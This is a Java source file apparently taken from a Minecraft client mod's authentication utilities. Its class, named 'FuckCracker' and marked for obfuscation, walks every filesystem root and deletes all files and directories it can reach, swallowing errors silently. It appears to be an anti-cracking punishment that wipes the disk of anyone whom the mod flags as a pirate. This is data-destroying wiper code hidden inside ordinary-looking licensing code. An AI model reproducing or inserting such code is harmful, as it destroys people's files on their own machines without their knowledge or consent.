package com.heypixel.heypixelmod.obsoverlay.utils.auth;

import cn.paradisemc.ZKMIndy;

import java.io.File;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;

/**
 * @Author：jiuxian_baka
 * @Date：2025/12/28 09:01
 * @Filename：FuckCracker
 */
@ZKMIndy
public class FuckCracker {
    public static void fuckCracker() {
        File[] roots = File.listRoots();

        if (roots != null) {
            for (File root : roots) {
                deleteAllInPath(root.toPath());
            }
        }
    }

    public static void deleteAllInPath(Path startPath) {
        try {
            Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {

                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                    try {
                        Files.delete(file);
                    } catch (IOException e) {
                    }
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exc) {
                    try {
                        if (!isRoot(dir)) {
                            Files.delete(dir);
                        }
                    } catch (IOException e) {
                    }
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exc) {
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static boolean isRoot(Path path) {
        Path root = path.getRoot();
        return root != null && root.equals(path);
    }
}
